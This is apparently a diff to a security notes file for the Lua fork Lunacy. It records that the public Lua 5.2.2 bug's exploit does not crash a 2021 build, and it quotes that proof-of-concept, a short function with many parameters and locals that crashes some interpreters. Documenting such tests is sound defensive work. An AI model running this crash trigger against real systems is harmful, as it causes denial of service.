@@ -31,6 +31,23 @@ index d1bf786..30333bf 100644
 
 Patched in commit 4de84e044c1219b06744bfc0d80f6b8568e58e9a
 
+Note: The exploit code at http://www.lua.org/bugs.html#5.2.2-1 does
+*not* crash Lunacy 2021-03-22.
+
+Exploit code:
+
+```
+function f(p1, p2, p3, p4, p5, p6, p7, p8, p9, p10,
+           p11, p12, p13, p14, p15, p16, p17, p18, p19, p20,
+           p21, p22, p23, p24, p25, p26, p27, p28, p29, p30,
+           p31, p32, p33, p34, p35, p36, p37, p38, p39, p40,
+           p41, p42, p43, p44, p45, p46, p48, p49, p50, ...)
+  local a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14
+end
+
+f()   -- crashes on some machines
+```
+
 # CVE-2020-15888
 
 [CVE-2020-15888](https://nvd.nist.gov/vuln/detail/CVE-2020-15888)
